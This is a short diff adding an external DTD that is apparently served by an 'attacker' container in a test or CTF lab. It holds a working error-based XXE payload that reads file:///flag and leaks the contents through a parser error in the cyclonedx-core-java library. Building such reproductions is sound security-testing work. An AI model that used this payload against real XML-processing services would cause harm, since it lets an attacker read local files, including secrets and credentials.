@@ -1,0 +1,8 @@
+<!-- Attacker-hosted external DTD (served by the `attacker` compose service at http://attacker/evil.dtd).
+     Error-based local-file-read XXE: read file:///flag into %file, then reference it as the SYSTEM id of
+     another (unresolvable) external entity so the REAL cyclonedx-core-java library's own parser/validator
+     raises an error whose message embeds the file content. Static/benign: contains no flag itself. -->
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'file:///PCBERR/%file;'>">
+%eval;
+%exfil;
